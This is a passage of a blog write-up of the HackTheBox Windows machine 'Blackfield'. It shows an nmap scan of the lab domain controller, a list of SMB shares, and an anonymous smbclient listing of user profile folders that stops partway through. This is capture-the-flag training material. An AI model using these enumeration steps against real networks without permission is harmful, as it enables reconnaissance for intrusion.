<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Hackthebox Blackfiled | C:\Users\DcodeZero</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Hackthebox Blackfiled" />
<meta name="author" content="jeevan" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I’ve enjoyed doing it." />
<meta property="og:description" content="Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I’ve enjoyed doing it." />
<link rel="canonical" href="http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html" />
<meta property="og:site_name" content="C:\Users\DcodeZero" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-07-11T21:50:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hackthebox Blackfiled" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"jeevan"},"dateModified":"2020-07-11T21:50:00+05:30","datePublished":"2020-07-11T21:50:00+05:30","description":"Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I’ve enjoyed doing it.","headline":"Hackthebox Blackfiled","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html"},"url":"http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="C:\Users\DcodeZero" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">C:\Users\DcodeZero<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/Dcodezer0"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-red-hover" href=""><i class="fab fa-itch-io"></i></a>
        
        
        
        <a class="color-purple-hover" href="https://github.com/DcodeZero"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">


<img src="
    /assets/avatar.png
" class="author-avatar" alt="Avatar" />
<div class="description">Hacker || Penetration Tester|| CTF Player || Blogger ||Independent  Researcher || Red Team Enthusiast || security practitioner.
</div>

</div>


<div class="post">
  <h1 class="post-title">Hackthebox Blackfiled</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/windows/">windows</a>
      
      <a class="tag" href="/tag/activedirectory/">activedirectory</a>
      
      <a class="tag" href="/tag/evilwinrm/">evilwinrm</a>
      
      <a class="tag" href="/tag/smb/">smb</a>
      
      <a class="tag" href="/tag/rpcclient/">rpcclient</a>
      
      <a class="tag" href="/tag/mimikatz/">mimikatz</a>
      
      <a class="tag" href="/tag/lsass/">lsass</a>
      
      <a class="tag" href="/tag/impacket/">impacket</a>
      
      <a class="tag" href="/tag/hashcat/">hashcat</a>
      
  </div>
  
  <div class="post-date">
    Published on 11 Jul 2020
    
    by jeevan
    
  </div>
  
  <noscript>
    <div class="post-description">Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I've enjoyed doing it.</div>
  </noscript>
  <div id="animated-post-description" class="post-description" style="display: none;"></div>
  
  <h2 id="info">INFO:</h2>

<table>
  <thead>
    <tr>
      <th>Blackfield</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS:</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td>Difficulty:</td>
      <td>Hard</td>
    </tr>
    <tr>
      <td>Points:</td>
      <td>40</td>
    </tr>
    <tr>
      <td>Release:</td>
      <td>06 Jun 2020</td>
    </tr>
    <tr>
      <td>IP:</td>
      <td>10.10.10.192</td>
    </tr>
  </tbody>
</table>

<h2 id="lets-start-hacking-into-blackfiled">let’s start hacking into <code class="language-plaintext highlighter-rouge">blackfiled</code></h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># nmap -O -A -T4 blackfiled.htb                                                                                                                                                                                             </span>
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span> <span class="mi">08</span><span class="p">:</span><span class="mi">45</span> <span class="no">EDT</span>                                                                                                                                                                            
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">blackfiled</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.192</span><span class="p">)</span>                                                                                                                                                                                         
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>                                                                                                                                                                                                                
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">993</span> <span class="n">filtered</span> <span class="n">ports</span>                                                                                                                                                                                                              
<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span>       <span class="no">VERSION</span>                                                                                                                                                                                                       
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">domain?</span>                                                                                                                                                                                                                     
<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="ss">strings:                                                                                                                                                                                                                     
</span><span class="o">|</span>   <span class="no">DNSVersionBindReqTCP</span><span class="p">:</span>                                                                                                                                                                                                                  
<span class="o">|</span>     <span class="n">version</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">bind</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="ss">time: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span> <span class="mi">19</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mo">04</span><span class="no">Z</span><span class="p">)</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local0</span><span class="p">.</span><span class="nf">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span>
<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mf">1.0</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ldap</span>          <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="no">BLACKFIELD</span><span class="p">.</span><span class="nf">local0</span><span class="p">.</span><span class="nf">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="o">.</span> <span class="no">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="nf">cgi?</span><span class="n">new</span><span class="o">-</span><span class="n">service</span> <span class="p">:</span>
<span class="no">SF</span><span class="o">-</span><span class="no">Port53</span><span class="o">-</span><span class="no">TCP</span><span class="ss">:V</span><span class="o">=</span><span class="mf">7.80</span><span class="o">%</span><span class="no">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="no">D</span><span class="o">=</span><span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">%</span><span class="no">Time</span><span class="o">=</span><span class="mi">5</span><span class="no">F09B484</span><span class="o">%</span><span class="no">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="no">DNSV</span>
<span class="no">SF</span><span class="ss">:ersionBindReqTCP</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="s2">"</span><span class="se">\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07</span><span class="s2">version\
SF:x04bind</span><span class="se">\0\0\x10\0\x03</span><span class="s2">"</span><span class="p">);</span>
<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="ow">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="no">OS</span> <span class="n">fingerprint</span> <span class="ow">not</span> <span class="n">ideal</span> <span class="ss">because: </span><span class="no">Missing</span> <span class="n">a</span> <span class="n">closed</span> <span class="no">TCP</span> <span class="n">port</span> <span class="n">so</span> <span class="n">results</span> <span class="n">incomplete</span>
<span class="no">No</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span>
<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">Host</span><span class="p">:</span> <span class="no">DC01</span><span class="p">;</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Windows</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows</span>

<span class="no">Host</span> <span class="n">script</span> <span class="ss">results:
</span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="ss">skew: </span><span class="mi">7</span><span class="n">h03m11s</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="ss">mode: 
</span><span class="o">|</span>   <span class="mf">2.02</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="no">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="ow">and</span> <span class="n">required</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="ss">time: 
</span><span class="o">|</span>   <span class="ss">date: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11</span><span class="no">T19</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">44</span>
<span class="o">|</span><span class="n">_</span>  <span class="ss">start_date: </span><span class="no">N</span><span class="o">/</span><span class="no">A</span>

<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
<span class="mi">1</span>   <span class="mf">185.74</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
<span class="mi">2</span>   <span class="mf">186.22</span> <span class="n">ms</span> <span class="n">blackfiled</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.192</span><span class="p">)</span>

<span class="no">OS</span> <span class="ow">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">224.21</span> <span class="n">seconds</span>
</code></pre></div></div>

<h2 id="smb-enumeration">SMB enumeration</h2>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">root</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 

        </span><span class="no">Sharename</span>       <span class="no">Type</span>      <span class="no">Comment</span>
        <span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
        <span class="no">ADMIN</span><span class="err">$</span>          <span class="no">Disk</span>      <span class="no">Remote</span> <span class="no">Admin</span>
        <span class="no">C</span><span class="err">$</span>              <span class="no">Disk</span>      <span class="no">Default</span> <span class="n">share</span>
        <span class="n">forensic</span>        <span class="no">Disk</span>      <span class="no">Forensic</span> <span class="o">/</span> <span class="no">Audit</span> <span class="n">share</span><span class="o">.</span>
        <span class="no">IPC</span><span class="err">$</span>            <span class="no">IPC</span>       <span class="no">Remote</span> <span class="no">IPC</span>
        <span class="no">NETLOGON</span>        <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
        <span class="n">profiles</span><span class="err">$</span>       <span class="no">Disk</span>      
        <span class="no">SYSVOL</span>          <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
<span class="no">SMB1</span> <span class="n">disabled</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>

</code></pre></div></div>

<h2 id="having-a-look-in-profiles">Having a look in <code class="language-plaintext highlighter-rouge">profiles$</code></h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Ac3:~# smbclient //10.10.10.192/profiles<span class="err">$</span>
Enter WORKGROUP<span class="se">\r</span>oot<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANavay                              D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  APustulka                           D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ARotella                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASischo                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATakach                             D        0  Wed Jun  3 12:47:11 2020                                                                                                                                                                 
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
